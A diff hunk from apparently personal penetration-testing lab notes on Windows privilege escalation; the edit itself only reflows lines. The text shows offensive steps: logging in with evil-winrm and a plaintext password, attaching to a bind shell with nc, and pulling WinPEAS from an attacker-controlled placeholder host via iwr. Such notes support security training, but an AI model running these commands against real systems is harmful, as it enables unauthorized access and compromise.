@@ -1034,11 +1034,12 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - Use evil-winrm to connect to CLIENTWK220 as daveadmin instead  
     `evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
 - Automated Enumeration
-  - Copy WinPEAS to our home directory and start Python3 web server
-    `cp /usr/share/peass/winpeas/winPEASx64.exe .`  `python3 -m http.server 80`
-  - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220
-    `nc 192.168.50.220 4444`  `powershell`
-    `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`  
+  - Copy WinPEAS to our home directory and start Python3 web server  
+    `cp /usr/share/peass/winpeas/winPEASx64.exe .`  `python3 -m http.server 80`  
+  - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220  
+    `nc 192.168.50.220 4444`   
+    `powershell`  
+    `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`   
   -  Run winPEAS `.\winPEAS.exe`  
   -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
 - Service Binary Hijacking (RDP)
